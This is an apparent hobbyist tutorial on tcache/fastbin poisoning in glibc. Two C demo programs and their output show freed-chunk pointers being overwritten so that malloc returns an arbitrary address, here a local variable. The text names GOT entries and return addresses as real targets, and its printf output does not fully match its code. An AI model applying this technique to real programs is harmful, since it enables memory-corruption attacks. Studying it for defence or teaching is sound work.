# Exploits
## Heap Fastbin Attack
## Requirements to undestand : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md (fastbins)
Please before reading this article i NEED you to understand how a fastbin works (https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md)  
So if you don't know, take a look  
## Insight
First i'm in 64 bits  
The exploit we're gonna see here is an arbiratry write exploit that so we can write to any address with it without changing anything directly from this address  
Let's have this C code to start :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    unsigned long* ptr1 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f
    unsigned long* ptr2 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f
    unsigned long* ptr3 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f

    printf("ptr1 -> 0x%x => 0x%x\n", ptr1, *ptr1);
    printf("ptr2 -> 0x%x => 0x%x\n", ptr2, *ptr2);
    printf("ptr3 -> 0x%x => 0x%x\n", ptr3, *ptr3);

    memset(ptr1, 'A', 0x20);
    memset(ptr2, 'B', 0x20);
    memset(ptr3, 'C', 0x20);

    printf("Freeing pointers\n");
    free(ptr1);
    free(ptr2);
    free(ptr3);

    printf("ptr1 -> 0x%x => 0x%lx\n", ptr1, *ptr1);
    printf("ptr2 -> 0x%x => 0x%lx\n", ptr2, *ptr2);
    printf("ptr3 -> 0x%x => 0x%lx\n", ptr3, *ptr3);

    unsigned long* ptr4 = malloc(0x20);
    unsigned long* ptr5 = malloc(0x20);
    unsigned long* ptr6 = malloc(0x20);

    printf("ptr4 -> 0x%x \n", ptr4);
    printf("ptr5 -> 0x%x\n", ptr5);
    printf("ptr6 -> 0x%x\n", ptr6);
}
```
**Disclamer : Here i will talk about fastbins, but since glibc >= 2.26, freed chunks are added first to tcache in priority, but it's behaviour is the same, works like a fastbin** 
I set the pointers to be unsigned long* so then we can write an unsigned long (address) to the value they contain
So we said (https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/The-Heap.md) that here `ptr1`, `ptr2` and `ptr3` are added (push front) to a linked list when they're freed, the fastbin  
After the frees, it will look like that :
```
Tcachebins[idx=1, size=0x30, count=3]
←  Chunk(addr=0x405300 (ptr3), size=0x30, flags=PREV_INUSE) 
←  Chunk(addr=0x4052d0 (ptr2), size=0x30, flags=PREV_INUSE) 
←  Chunk(addr=0x4052a0 (ptr1), size=0x30, flags=PREV_INUSE) 
```
GEF representation is really weird, see it more like this :
```
Tcachebins[idx=1, size=0x30, count=3] : 0x405300 (ptr3) -> 0x4052d0 (ptr2) -> 0x4052a0 (ptr1) -> 0 (NULL)
```
So each chunk user data 8 first bytes from ptr3 pointer to next one (ptr3, ptr2, ptr1)  
So remember, it's :
```
*ptr3 = ptr2;
*ptr2 = ptr1;
*ptr1 = NULL;
```
Now when we malloc our new pointers (ptr1, ptr2, ptr3) :
```
ptr4 = 0x405300;
ptr5 = *ptr3 = *0x405300 = ptr2 = 0x4052d0;
ptr6 = *ptr2 = *0x4052d0 = ptr1 = 0x4052a0;
```
There's something really interesting here, `ptr6` points to `*ptr2`, wait but, we have the control of this `*ptr2`, of course ! It's the user data / memory of the seond chunk !  
So if we put any address, a function pointer, or a variable in this `*ptr2` it will malloc the new chunk's user data / memory in there  
So here's our plan :
- First malloc (ptr1, ptr2, ptr3) in this order (same size = 0x20) **done**
- Then free them in order ptr1, ptr2, ptr3 **done**
- And now changing `*ptr2`' (so seond chunk's memory / user data) to any address we want !  
- Now we allocate `ptr4 = malloc(0x20)`
- Then `ptr5 = malloc(0x20)`
- And finally `ptr6 = malloc(0x20)` and this ptr6 has the address `*ptr2` so we can just set `*ptr2` to like a stack variable or a GOT entry, or function pointer, or return address

So here is the actual exploit :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
	unsigned long changeMe = 0xdeadbeefdeadc0de;
	printf("changeMe variable address : %p\n", changeMe);
	unsigned long* ptr1 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f
	unsigned long* ptr2 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f
	unsigned long* ptr3 = malloc(0x20); // Linked list idx 1 => 0x20-0x2f

	printf("ptr1 -> 0x%x => 0x%x\n", ptr1, *ptr1);
	printf("ptr2 -> 0x%x => 0x%x\n", ptr2, *ptr2);
	printf("ptr3 -> 0x%x => 0x%x\n", ptr3, *ptr3);

	memset(ptr1, 'A', 0x20);
	memset(ptr2, 'B', 0x20);
	memset(ptr3, 'C', 0x20);

	printf("Freeing pointers\n");
	free(ptr1);
	free(ptr2);
	free(ptr3);

	*ptr2 = &changeMe;

	printf("ptr1 -> 0x%x => 0x%lx\n", ptr1, *ptr1);
	printf("ptr2 -> 0x%x => 0x%lx\n", ptr2, *ptr2);
	printf("ptr3 -> 0x%x => 0x%lx\n", ptr3, *ptr3);

	unsigned long* ptr4 = malloc(0x20);
	unsigned long* ptr5 = malloc(0x20);
	unsigned long* ptr6 = malloc(0x20);

	printf("ptr4 -> 0x%x \n", ptr4);
	printf("ptr5 -> 0x%x\n", ptr5);
	printf("ptr6 -> 0x%x\n", ptr6);

	*ptr6 = 1337;

	printf("changeMe has the valuee... : 0x%lx\n", changeMe); 

}
```
So i just created a `changeMe` value to modify without making any direct changes to it, so i set `*ptr2` to the address of this variable  
We change `*ptr6` (malloc for this pointer returned the address of this `changeMe` variable) to `1337`  
Again the target address could be anything, function pointer, return address, GOT entry...  
And we print `changeMe` and now...  
```
changeMe variable address : 0x7fffffffdf48
ptr1 -> 0x555596b0 => 0x0
ptr2 -> 0x555596e0 => 0x0
ptr3 -> 0x55559710 => 0x0
Freeing pointers
ptr1 -> 0x555596b0 => 0x0
ptr2 -> 0x555596e0 => 0x7fffffffdf48
ptr3 -> 0x55559710 => 0x5555555596e0
ptr4 -> 0x55559710 
ptr5 -> 0x555596e0
ptr6 -> 0xffffdf48 <- changeMe address (&changeMe)
changeMe has the valuee... : 0x539
```
As you can see `ptr6` points now to `changeMe` variable so then when we modified `ptr6` it set this value to `changeMe`, as you can see now, `changeMe` is `0x539` which is the hex value for `1337` that we set  
Thanks for reading !
